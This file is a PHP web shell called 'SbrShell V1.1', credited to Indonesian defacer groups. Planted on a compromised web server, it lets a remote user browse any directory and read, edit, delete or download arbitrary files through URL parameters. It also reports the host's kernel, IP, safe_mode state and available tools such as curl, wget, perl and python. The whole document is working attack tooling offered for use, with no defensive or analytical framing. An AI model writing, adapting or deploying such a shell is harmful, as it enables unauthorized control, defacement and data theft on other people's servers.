<?php
/*
IN THE NAME OF ALLAH SWT.
SbrShell.php V1.1 Release
AUTHOR : MRDULL86 - M.ABDUL.S
THANKS TO :
TRUELOGIC ATTACKER , GAROODA SECURITY SQUAD
ALL DEFACER INDONESIA.
13 February 2017
PLEASE DON'T REMOVE THIS AUTHOR!!!

THIS IS SIMPLE PHP SHELL SCRIPT
FITURE:
-DELETE 
-REMOVE
-EDIT
-DOWNLOAD
*/
set_time_limit(99999999);
$sbr = $_SERVER["PHP_SELF"];
$thisdir = dirname($_SERVER["PHP_SELF"]);
if(isset($_REQUEST["godir"]))
{
	$realdir = $_GET["godir"];
}
else
{
	$realdir = getcwd();
}
$no = "1";
//fungsi2
function all($f)
{
	switch($f)
	{
		case "k":
		{
			$kernel = php_uname();
			return $kernel;
		}
		break;
		case "ip":
		{
			$ip = gethostbyname($_SERVER['HTTP_HOST']);
			return $ip;
		}
		break;
		case "sm":
		{
			$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font id='hejo'>ON</font>" : "<font id='reds'>OFF</font>";
			return $sm;
		}
		break;
		case "msql":
		{
			$mysql = (function_exists('mysql_connect')) ? "<font id='hejo'>ON</font>" : "<font id='reds'>OFF</font>";
			return $mysql;
		}
		break;
		case "curl":
		{
			$curl = (function_exists('curl_version')) ? "<font id='hejo'>ON</font>" : "<font id='reds'>OFF</font>";
			return $curl;
		}
		break;
		case "wget":
		{
			$wget = (exe('wget --help')) ? "<font id='hejo'>ON</font>" : "<font id='reds'>OFF</font>";
			return $wget;
		}
		break;
		case "perl":
		{
			$perl = (exe('perl --help')) ? "<font id='hejo'>ON</font>" : "<font id='reds'>OFF</font>";
			return $perl;
		}
		break;
		case "py":
		{
			$py = (exe('python --help')) ? "<font id='hejo'>ON</font>" : "<font id='reds'>OFF</font>";
			return $py;
		}
		break;
	}
}
//end
$header = "
<html>
<head>
<title>SBR</title>
</head>
<style>
#head
{
	background-color: #607d8b;
	text-align: center;
	font-family: monospace;
	width: 100%;
}
#body
{
	 background-color: #9e9e9e;
	 padding: 10px 10px;
	 width: 100%;
}
input[type=text]
{
	 background-color: #ecf0f1;
	 padding: 5px 5px;
	 color: #607d8b;
	 width: 50%;
}
input[type=text]:focus
{
	 background-color: #ecf0f1;
	 padding: 5px 5px;
	 color: #607d8b;
	 border: 2px solid #ff5722;
	 width: 90%;
}
input[type=submit]
{
	 background-color: #cfd8dc;
	 padding: 8px 8px;
	 color: #607d8b;
}
input[type=submit]:hover
{
	 background-color: #cfd8dc;
	 padding: 8px 8px;
	 color: #ff5722;
}
#text
{
	color: #ff5722
}
#text:hover
{
	color: #ff9800;
}
H1{
font-family: \"Rye\", cursive;
}
#dir
{
	background-color: #b0bfc5;
	padding: 4px 4px;
	border: 3px solid orange;
}
</style>
<head>
<title>SBR SHELL V1.1</title>
</head>
<body>
<div align=\"center\">
<!--MULAI KONTEN-->
<div id=\"head\">
<H1 id=\"text\" style=\"text-size: 30px;\">S-B-R SHELL V.1.1</H1>
<font id=\"text\">&copy; 2016-2017 Muhammad Abdul Sobur</font> | <font color=\"red\">INDO</font><font color=\"white\">NESIA</font>
<div align=\"left\" style=\"width: 100%;\">
<form action=\"$sbr?t=d\" method=\"GET\">
<label id=\"text\" for=\"godir\">Go Directory</label>
<input type=\"text\" name=\"godir\" value=\"$realdir\">
<input type=\"submit\" name=\"go\" value=\"=>\">
</form>
</div>
<div align=\"center\" id=\"dir\">
<!--DIR-->
<table width=\"700\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\">
<tr>
<td>No</td>
<td>Name</td>
<td>Size</td>
<td>Operation</td>
</tr>
";
echo $header;
if(isset($_POST["edit"]))
{
	$isi = $_POST["isi"];
	$path = $_POST["path"];
	edit($isi,$path);
}
if(isset($_REQUEST["f"]))
{
	switch($_GET["f"])
	{
		case "edit":
		{
			$isi = htmlspecialchars(file_get_contents($_GET["p"]));
			$file = $_GET["p"];
			echo "<form method=\"POST\" action=\"$sbr\">
				Edit file : $file </br>
				<textarea style=\"width: 80%; height: 300px;\" type=\"text\" name=\"isi\">$isi</textarea></br>
				<input style=\"width: 80%;\" type=\"submit\" name=\"edit\" value=\"EDIT =>\">
				<input type=\"hidden\" name=\"path\" value=\"$file\">
				</form>";
		}
		break;
		case "del":
		{
			del($_GET["p"]);
		}
		case "down":
		{
			$file = $_GET["p"];
			header('Content-Description: File Transfer');
			header('Content-Type: application/octet-stream');
			header('Content-Disposition: attachment; filename="'.basename($file).'"');
			header('Expires: 0');
			header('Cache-Control: must-revalidate');
			header('Pragma: public');
			header('Content-Length: ' . filesize($file));
			readfile($file);
		}
	}
}
if(isset($_REQUEST["godir"]))
{
	$p = $_GET["godir"];
	$dh = opendir($p);
	chdir($p);
    $umpetke_berkas = array('index.php');
    $umpetke_ext = array('php, html');
    while (false !== ($file = readdir($dh)))
    {
        if ($file != "." && $file != ".." && !in_array($file, $umpetke_berkas) && !in_array(pathinfo($file, PATHINFO_EXTENSION), $umpetke_ext))
        { 
            $realp = realpath($file);
            $no++;
		    echo "<tr>";
		    //no
		    echo "<td><font color=\"white\">$no</font></td>";
		    //name
		    echo "<td><font id=\"text\">$file</font></td>";
		    //size
		    if(is_file($file))
		    {
			     echo "<td><font style=\"color: white;\">".filesize($file)."</font></td>";
		     }
		    else
		    {
			     echo "<td><font style=\"color: red;\">--</font></td>";
		    }
		    //op
		    echo "<td><a href=\"$sbr?f=edit&p=$realp\">[EDIT] </a><a href=\"$sbr?f=del&p=$realp\">[DELETE]</a><a href=\"$sbr?f=down&p=$realp\">[DOWNLOAD]</a></td>";
		    //end
		    echo "</tr>";
        } 
    } 
    closedir($dh); 
}
echo "</table>";
echo "</div></div></body></html>";
function del($f)
{
	if(unlink($f))
	{
		echo "<font id=\"text\">Succes Delete $f !</font>";
	}
	else
	{
		echo "<font id=\"text\">Denied to delete $f !</font>";
	}
}
function edit($isi,$path)
{
	file_put_contents($path,$isi);
	echo "<h4 id=\"text\">File Sukses Ter-Edit</h4>";
}
?>